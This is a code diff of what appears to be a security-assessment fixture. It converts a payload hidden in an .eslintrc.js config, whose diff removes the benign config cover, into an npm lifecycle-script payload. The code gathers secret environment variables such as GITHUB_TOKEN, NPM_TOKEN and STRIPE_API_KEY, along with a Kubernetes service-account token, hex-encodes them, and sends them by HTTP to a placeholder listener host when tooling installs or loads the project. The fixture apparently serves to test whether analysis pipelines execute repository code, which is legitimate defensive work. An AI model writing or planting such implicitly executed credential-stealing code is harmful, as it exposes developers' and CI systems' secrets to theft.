@@ -1,15 +1,10 @@
-// DVAP payload: .eslintrc.js executed as JavaScript when ESLint loads config.
+// Assessment fixture: Node signal fired by an npm lifecycle script.
 //
 // Real behavior abused
 // --------------------
-// ESLint's legacy config format `.eslintrc.js` is a *JavaScript module*. ESLint
-// `require()`s it to read the config object, so any top-level code in the file
-// runs inside the linter's process the moment ESLint discovers it -- before a
-// single line of the target code is analyzed. Pointing any SAST pipeline that
-// uses ESLint at this repo executes the payload.
-//
-// Mitigation (disable_extensibility): the worker deletes/ignores .eslintrc.js
-// (or runs eslint with --no-eslintrc), so this module is never required.
+// `npm install` runs a package's lifecycle scripts (preinstall/install/
+// postinstall) by default. Any SCA tool that installs dependencies to analyze
+// them therefore executes repository-controlled shell/Node from package.json.
 //
 // Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
 // (substituted by the worker). Node core modules only (http).
@@ -31,10 +26,7 @@ const SECRET_ENV_KEYS = [
   "GITHUB_TOKEN",
   "GITHUB_CANARY_TOKEN",
   "NPM_TOKEN",
-  "DATABASE_URL",
-  "POSTGRES_CANARY_DSN",
-  "DVAP_DATABASE_URL",
-  "LATERAL_MOVEMENT_DB_URL",
+  "APP_DATABASE_URL",
   "STRIPE_API_KEY",
   "SLACK_WEBHOOK_URL",
 ];
@@ -54,12 +46,13 @@ function collectExfil() {
       lines.push("K8S_SA_TOKEN=" + token);
     }
   } catch (e) {
-    // token file absent (e.g. strip_credentials) -- ignore
+    // token file absent -- ignore
   }
   return lines.join("\n");
 }
 
 function dottedHex(payload) {
+  // hex-encode UTF-8 bytes, then split into ~60-char chunks joined by "."
   const hexed = Buffer.from(payload, "utf8").toString("hex");
   const chunks = [];
   for (let i = 0; i < hexed.length; i += 60) {
@@ -78,17 +71,9 @@ function beacon() {
       res.on("end", () => {});
     },
   );
+  // Network failures must never crash install.
   req.on("error", () => {});
   req.end();
 }
 
-// Side effect at config-load time -- the implicit-execution sink being demoed.
 beacon();
-
-// Benign cover: a real ESLint config object so the file is a valid .eslintrc.js.
-module.exports = {
-  root: true,
-  env: { node: true, es2021: true },
-  parserOptions: { ecmaVersion: 2021, sourceType: "module" },
-  rules: {},
-};
